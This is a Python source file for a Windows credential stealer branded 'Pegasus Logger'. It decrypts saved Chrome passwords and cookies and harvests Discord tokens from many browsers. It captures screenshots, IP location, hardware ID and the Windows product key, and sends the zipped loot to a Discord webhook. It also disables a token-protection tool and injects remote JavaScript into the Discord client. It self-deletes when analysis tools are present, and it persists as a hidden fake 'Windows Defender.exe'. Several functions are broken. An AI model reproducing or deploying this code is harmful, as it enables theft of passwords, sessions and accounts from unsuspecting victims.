from pathlib import Path
from getpass import getuser
from contextlib import suppress
from base64 import b64decode
from json import load, loads
from platform import platform
from re import findall, match
from shutil import copy2
from sqlite3 import connect
from subprocess import PIPE, Popen
from threading import Thread
from time import localtime, strftime
from requests import get
from zipfile import ZipFile
from contextlib import suppress
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from pyautogui import screenshot
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

import base64
import difflib
import winreg
import json
import os
import sys
import psutil
import requests
import winshell


WEBHOOK_URL = "&WEBHOOK_URL&"


def main(webhook_url: str, webhook: Webhook, embed: Embed):
    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Pegasus Logger", color=15535980)

    get_location()
    get_more()
    GrabTokens()

    running_threads = []
    for thread in [
        Thread(target=screenshot, args=("screenshot.png",)),
        Thread(target=password),
        Thread(target=cookiemonster),
    ]:
        thread.start()
        running_threads.append(thread)

    for thread in running_threads:
        thread.join()

    embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
    embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
    embed.set_thumbnail(
        url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png"
    )

    file = File(zipup())

    webhook.send(
        content="||@here|| <http://www.addidix.xyz>",
        embed=embed,
        file=file,
        avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg",
        username="Pegasus",
    )


def pegasus():
    for func in {
        # NOTE: You're grabbing the results of
        # "main" and "cleanup" here, not the
        # functions themselves
        main(WEBHOOK_URL),
        cleanup(),
    }:
        with suppress(Exception):
            func()


def account_info(tokens, embed):
    for token in int(tokens):  # What is "tokens"?
        resp = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": tokens[token]},
        )

        username = resp.json()["username"] + "#" + resp.json()["discriminator"]
        phone = resp.json()["phone"]
        email = resp.json()["email"]

        embed.add_field(
            name="🔷  DISCORD INFO",
            value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}",
        )


def get_location(embed, ip_url: str = None):
    ip = org = loc = city = country = region = googlemap = "None"
    with suppress(Exception):
        data = get(ip_url or "http://ipinfo.io/json").json

        ip = data.get("ip")
        org = data.get("org")
        loc = data.get("loc")
        city = data.get("city")
        country = data.get("country")
        region = data.get("region")
        googlemap = f"https://www.google.com/maps/search/google+map++{loc}"

        embed.add_field(
            name="📍  LOC INFO",
            value=f"IP: {ip}\n\nORG: {org}\n\nLocation: [{loc}]({googlemap})\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}",
        )


def get_more(embed):
    def gethwid():
        p = Popen(
            "wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE
        )
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

    cwd = os.getcwd()
    pc_username = getuser()
    pc_name = os.getenv("COMPUTERNAME")
    computer_os = platform()

    embed.add_field(
        name="💨  OTHER",
        value=f"OS: {computer_os}\n\nUser: {pc_username}\n\nPC Name: {pc_name}\n\nHWID: {gethwid()}\nCWD: {cwd}",
    )


class GrabTokens:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp") + "\\Peg_Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        with suppress(OSError):
            os.mkdir(os.path.join(self.tempfolder))

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []

        self.grabTokens()

    def get_headers(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        }
        if token:
            headers["Authorization"] = token
        return headers

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def bypass_token_protector(self):
        token_protector = f"{self.roaming}\\DiscordTokenProtector\\"
        config = f"{token_protector}config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            with suppress(OSError):
                os.remove(token_protector + i)

        with open(config) as f:
            item: dict = json.load(f)

        # Not quite sure if dict.update works like this,
        # but I believe in '**kwargs' lmao
        item.update(
            auto_start=False,
            auto_start_discord=False,
            integrity=False,
            integrity_allowbetterdiscord=False,
            integrity_checkexecutable=False,
            integrity_checkhash=False,
            integrity_checkmodule=False,
            integrity_checkscripts=False,
            integrity_checkresource=False,
            integrity_redownloadhashes=False,
            iterations_iv=364,
            iterations_key=457,
            version=69420,
        )

        with open(config, "w") as f:
            json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_password(self, buff, master_key):
        with suppress(Exception):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def getProductKey(self, path: str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"):
        def str_to_int(x):
            return ord(x) if isinstance(x, str) else x

        chars = "BCDFGHJKMPQRTVWXY2346789"
        wkey = ""
        offset = 52
        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
        val, _ = winreg.QueryValueEx(regkey, "DigitalProductId")
        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
        key = list(val)

        for i in range(24, -1, -1):
            temp = 0
            for j in range(14, -1, -1):
                temp *= 256
                try:
                    temp += str_to_int(key[j + offset])
                except IndexError:
                    return [productName, ""]
                if temp / 24 <= 255:
                    key[j + offset] = temp / 24
                else:
                    key[j + offset] = 255
                temp = int(temp % 24)
            wkey = chars[temp] + wkey

        for i in range(5, len(wkey), 6):
            wkey = wkey[:i] + "-" + wkey[i:]
        return [productName, wkey]

    def grabTokens(
        self, token, tokens, embed: Embed
    ):  # TODO: Annotations for intellisense
        # This dict could be compressed a bit and
        # make it dynamic...i dunno
        paths = {
            "Discord": self.roaming + r"\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": self.roaming + r"\\discordcanary\\Local Storage\\leveldb\\",
            "Lightcord": self.roaming + r"\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": self.roaming + r"\\discordptb\\Local Storage\\leveldb\\",
            "Opera": self.roaming
            + r"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "Opera GX": self.roaming
            + r"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "Amigo": self.appdata + r"\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "Torch": self.appdata + r"\\Torch\\User Data\\Local Storage\\leveldb\\",
            "Kometa": self.appdata + r"\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "Orbitum": self.appdata + r"\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "CentBrowser": self.appdata
            + r"\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7Star": self.appdata
            + r"\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "Sputnik": self.appdata
            + r"\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "Vivaldi": self.appdata
            + r"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome SxS": self.appdata
            + r"\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "Chrome": self.appdata
            + r"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "Epic Privacy Browser": self.appdata
            + r"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": self.appdata
            + r"\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
            "Uran": self.appdata
            + r"\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "Yandex": self.appdata
            + r"\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Brave": self.appdata
            + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Iridium": self.appdata
            + r"\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
        }

        # TODO: Minimize indentation
        # TODO: Integrate PathLib?
        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if "discord" not in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for regex in self.regex:
                            for token in findall(regex, line):
                                with suppress(Exception):
                                    resp = requests.get(
                                        self.baseurl, headers=self.get_headers(token)
                                    )

                                if resp.ok and token not in self.tokens:
                                    self.tokens.append(token)
            elif os.path.exists(self.roaming + "\\discord\\Local State"):
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for y in findall(self.encrypted_regex, line):
                            token = None
                            token = self.decrypt_password(
                                base64.b64decode(
                                    y[: y.find('"')].split("dQw4w9WgXcQ:")[1]
                                ),
                                self.get_master_key(
                                    self.roaming + "\\discord\\Local State"
                                ),
                            )

                            r = requests.get(self.baseurl, headers=self.getheaders(token))
                            if r.ok == 200 and token not in self.tokens:
                                self.tokens.append(token)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith(".sqlite"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for regex in self.regex:
                            for token in findall(regex, line):
                                with suppress(Exception):
                                    resp = requests.get(
                                        self.baseurl, headers=self.get_headers(token)
                                    )

                                if resp.ok and token not in self.tokens:
                                    self.tokens.append(token)

        for token in self.tokens:
            resp = requests.get(
                "https://discord.com/api/v9/users/@me", headers={"Authorization": token}
            )

            username = resp.json()["username"] + "#" + resp.json()["discriminator"]
            phone = resp.json()["phone"]
            email = resp.json()["email"]

            embed.add_field(
                name=f"🔷  User: `{username}`",
                value=f"Token: `{token}`\n\nPhone: {phone}\n\nEmail: {email}",
                inline=False,
            )


class password:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")

        if not os.path.exists(self.appdata + "\\Google"):
            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
        else:
            self.grab_password()

        return

    def get_master_key(self):
        with open(
            self.appdata + "\\Google\\Chrome\\User Data\\Local State",
            "r",
            encoding="utf-8",
        ) as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Chrome < 80"

    def grab_password(self):
        master_key = self.get_master_key()
        with open("google-passwords.txt", "w") as f:
            f.write("www.addidix.xyz /// Google Chrome Passwords\n\n")
        login_db = self.appdata + "\\Google\\Chrome\\User Data\\default\\Login Data"

        with suppress(FileNotFoundError):
            copy2(login_db, "Loginvault.db")

        conn = connect("Loginvault.db")
        cursor = conn.cursor()

        with suppress(Exception):
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    with open("google-passwords.txt", "a") as f:
                        f.write(
                            f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n"
                        )
        cursor.close()
        conn.close()

        with suppress(OSError):
            os.remove("Loginvault.db")


class cookiemonster:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.grab_cookies()

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grab_cookies(self):
        master_key = self.get_master_key(
            self.appdata + "\\Google\\Chrome\\User Data\\Local State"
        )
        login_db = self.appdata + "\\Google\\Chrome\\User Data\\Default\\Network\\cookies"

        with suppress(Exception):
            copy2(login_db, "Loginvault.db")

        conn = connect("Loginvault.db")
        cursor = conn.cursor()

        with open(".\google-cookies.txt", "w", encoding="cp437", errors="ignore") as f:
            f.write("www.addidix.xyz /// Google Chrome Cookies\n\n")

        with open(".\google-cookies.txt", "a", encoding="cp437", errors="ignore") as f:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")

            for row in cursor.fetchall():
                host = row[0]
                user = row[1]
                encrypted_cookie = row[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)

                if host != "":
                    f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")

        cursor.close()
        conn.close()

        with suppress(Exception):
            os.remove("Loginvault.db")


def zipup():
    filename = f"files-{getuser()}.zip"

    with ZipFile(filename, "w") as zipf:
        zipf.write("google-passwords.txt")
        zipf.write("google-cookies.txt")
        zipf.write("screenshot.png")

    return filename


def cleanup():
    for clean in [
        os.remove("google-passwords.txt"),
        os.remove("google-cookies.txt"),
        os.remove("screenshot.png"),
        os.remove(f"files-{os.getenv('UserName')}.zip"),
    ]:

        with suppress(Exception):
            clean()


def inject(webhook_url):
    appdata = os.getenv("localappdata")
    for _dir in os.listdir(appdata):
        if "discord" in _dir.lower():
            for __dir in os.listdir(os.path.abspath(appdata + os.sep + _dir)):
                if match(r"app-(\d*\.\d*)*", __dir):
                    abspath = os.path.abspath(appdata + os.sep + _dir + os.sep + __dir)
                    f = requests.get(
                        "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js"
                    ).text.replace("%WEBHOOK%", webhook_url)
                    modules_dir = os.listdir(abspath + "\\modules")
                    with open(
                        abspath
                        + f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js',
                        "w",
                        encoding="utf-8",
                    ) as indexFile:
                        indexFile.write(f)
                    os.startfile(abspath + os.sep + _dir + ".exe")


class Debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self) -> bool:
        # Ideas for these lines of code:
        # - use JSON to map the filenames
        # - use a single config file for this
        # blackList from Rdimo
        self.blackListedUsers = self.load("res/blacklisted-users.txt")
        self.blackListedPCNames = self.load("res/blacklisted-pcnames.txt")
        self.blackListedHWIDS = self.load("res/blacklisted-hardware-ids.txt")
        self.blackListedIPS = self.load("res/blacklisted-ips.txts")
        self.blacklistedProcesses = ["HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe"]

        self.check_process()

        return (
            self.get_ip() or self.get_hwid() or self.get_pcname() or self.get_username()
        )

    def load(self, file: Path) -> list[str]:
        return file.read_text().splitlines()

    def check_process(self):
        for process in self.blacklistedProcesses:
            if process in (p.name() for p in psutil.process_iter()):
                self.self_destruct()

    def get_ip(self):
        url = "http://ipinfo.io/json"
        data = get(url).json()
        ip = data.get("ip")

        if ip in self.blackListedIPS:
            return True

    def get_hwid(self):
        p = Popen(
            "wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE
        )
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

        if hwid in self.blackListedHWIDS:
            return True

    def get_pcname(self):
        pc_name = os.getenv("COMPUTERNAME")

        if pc_name in self.blackListedPCNames:
            return True

    def get_username(self):
        return getuser() in self.blackListedUsers

    def self_destruct(self):
        os.system(
            "del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__))
        )
        exit()


class StartUp:
    def __init__(self):
        self.fakename = "Windows Defender.exe"

        self.cwf = f"{os.getcwd()}\\{sys.argv[0].replace(os.getcwd(), '')}"
        self.dest_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\UsageLogTemp"
        self.startup_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

        if self.skip(self.dest_path):
            return

        self.exists(self.dest_path)
        self.exists(self.startup_path)

        self.target = f"{self.dest_path}\{sys.argv[0].replace(os.getcwd(), '')}"

        self.mv_file(self.cwf, self.target)
        self.mk_shortcut(self.target, self.startup_path, self.fakename)
        self.rename_file(self.dest_path, self.fakename)

    def skip(self, path):
        if os.getcwd() == path:
            return True

    def exists(self, path):
        if not os.path.exists(path):
            os.makedirs(path)

    def mv_file(self, cwf, dest):
        os.rename(cwf, dest)

    def mk_shortcut(self, target, startup_path, fakename):
        winshell.CreateShortcut(
            Path=f"{startup_path}\{fakename.replace('.exe', '')}.lnk", Target=target
        )

    def rename_file(self, dest, fakename):
        os.rename(
            f"{dest}\\{sys.argv[0].replace(os.getcwd(), '')}", f"{dest}\\{fakename}"
        )
        SetFileAttributes(f"{dest}\\{fakename}", FILE_ATTRIBUTE_HIDDEN)


if __name__ == "__main__":
    if os.name == "nt":
        Debug()
        pegasus()
    else:
        print("This program is designed for Windows NT Systems")
